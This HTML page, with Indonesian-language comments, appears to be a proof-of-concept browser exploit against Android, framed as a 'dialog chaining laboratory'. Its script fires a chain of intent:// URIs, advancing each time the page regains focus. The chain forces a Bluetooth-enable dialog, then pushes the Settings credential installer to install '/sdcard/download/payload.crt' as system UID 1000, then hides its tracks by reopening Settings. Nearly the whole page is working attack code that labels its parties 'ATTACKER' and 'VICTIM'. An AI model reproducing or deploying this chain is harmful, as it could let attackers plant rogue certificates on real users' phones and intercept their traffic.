<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Optimized Dialog Intent Lab</title>
<style>
    body{font-family:monospace; padding:20px; background:#080505; color:#ff6600;}
    button{width:100%; padding:18px; margin-top:15px; background:#1c0f0a; color:#ff6600; border:1px solid #ff6600; font-weight:bold; cursor:pointer; font-size:14px; text-transform:uppercase;}
    button:hover{background:#ff6600; color:#000; box-shadow: 0 0 15px #ff6600;}
    .status-panel{border:1px solid #ff6600; padding:15px; margin-bottom:15px; background:#0f0907;}
    #console-log{margin-top:20px; border:1px solid #ff6600; padding:12px; height:380px; overflow:auto; white-space:pre-wrap; background:#000; font-size:12px; color:#00ff66;}
    .role-tag{font-weight:bold; padding:2px 6px; border-radius:3px; font-size:10px;}
    .attacker{background:#ff3333; color:#000;}
    .victim{background:#ff6600; color:#000;}
</style>
</head>
<body>

<h2>Optimized Dialog Chaining Laboratory</h2>

<div class="status-panel">
    <p>Pipeline State: <span id="harness-state" style="font-weight:bold; color:#ff3333;">STANDBY</span></p>
    <p>Control Mode: <span class="role-tag attacker">DIALOG ESCALATION ENGINE</span></p>
    <button id="launch-dialog-chain">Execute Dialog-Driven Chain</button>
</div>

<div id="console-log"></div>

<script>
const consoleLog = document.getElementById("console-log");
const stateLabel = document.getElementById("harness-state");

let currentStage = 0;
let attackActive = false;

function writeLog(sender, text) {
    const timestamp = new Date().toLocaleTimeString();
    const tag = sender === 'ATTACKER' ? '[ATTACKER]' : '[VICTIM_NODE]';
    consoleLog.textContent += `[${timestamp}] ${tag} ${text}\n`;
    consoleLog.scrollTop = consoleLog.scrollHeight;
}

function buildAdvancedUri(action, component = '', extras = {}, flags = '0x14010000') {
    let uri = `intent:#Intent;action=${action};`;
    if (component) uri += `component=${component};`;
    
    Object.keys(extras).forEach(key => {
        uri += `S.${key}=${encodeURIComponent(extras[key])};`;
    });
    
    uri += `launchFlags=${flags};category=android.intent.category.DEFAULT;end`;
    return uri;
}

function dispatchImmediate(uri) {
    try {
        const anchor = document.createElement("a");
        anchor.href = uri;
        anchor.rel = "noopener noreferrer";
        document.body.appendChild(anchor);
        anchor.click();
        anchor.remove();
        writeLog('ATTACKER', `Payload routed to system interface.`);
    } catch (e) {
        writeLog('VICTIM', `Dispatch failure: ${e.message}`);
    }
}

// Alur Eksekusi Berbasis Validasi Respon Fokus
function executeNextStage() {
    if (!attackActive) return;

    currentStage++;
    
    if (currentStage === 1) {
        writeLog('ATTACKER', "Memicu Tahap 1: Memaksa Dialog Permintaan Aktivasi Bluetooth Jarak Jauh...");
        
        // Menargetkan aktivitas dialog sistem untuk meminta pengaktifan Bluetooth secara langsung
        const stage1 = buildAdvancedUri(
            "android.bluetooth.adapter.action.REQUEST_ENABLE",
            "com.android.settings/.bluetooth.RequestEnableActivity"
        );
        dispatchImmediate(stage1);
        
    } else if (currentStage === 2) {
        writeLog('ATTACKER', "Siklus Fokus Berubah. Memicu Tahap 2: Simulasi Parameter Redirection...");
        
        const stage2 = buildAdvancedUri(
            "android.intent.action.VIEW",
            "com.android.settings/.crypto.CredentialsInstaller",
            {
                "install_as_uid": "1000",
                "sys_vulnerable_path": "/sdcard/download/payload.crt"
            },
            "0x10000000"
        );
        dispatchImmediate(stage2);
        
    } else if (currentStage === 3) {
        writeLog('ATTACKER', "Siklus Fokus Berubah. Memicu Tahap 3: Restorasi Konteks Halaman...");
        const stage3 = buildAdvancedUri("android.settings.SETTINGS", "", {}, "0x14000000");
        dispatchImmediate(stage3);
        
        writeLog('ATTACKER', "Rantai interaksi selesai.");
        stateLabel.textContent = "COMPLETED";
        attackActive = false;
    }
}

document.getElementById("launch-dialog-chain").addEventListener("click", () => {
    if (attackActive) return;
    
    attackActive = true;
    currentStage = 0;
    stateLabel.textContent = "PROCESSING CHAIN";
    writeLog('ATTACKER', "Inisialisasi sistem pengujian berbasis komponen dialog...");
    executeNextStage();
});

// Deteksi perubahan fokus akibat kemunculan dialog sistem di atas browser
document.addEventListener("visibilitychange", () => {
    if (!attackActive) return;

    if (document.hidden) {
        writeLog('VICTIM', "Telemetri: Fokus browser terganggu oleh Dialog Sistem / Overlay.");
    } else {
        writeLog('VICTIM', "Telemetri: Browser mendeteksi pemulihan fokus layar.");
        executeNextStage();
    }
});

writeLog('ATTACKER', "Mesin pengujian dialog otonom siap.");
</script>
</body>
</html>
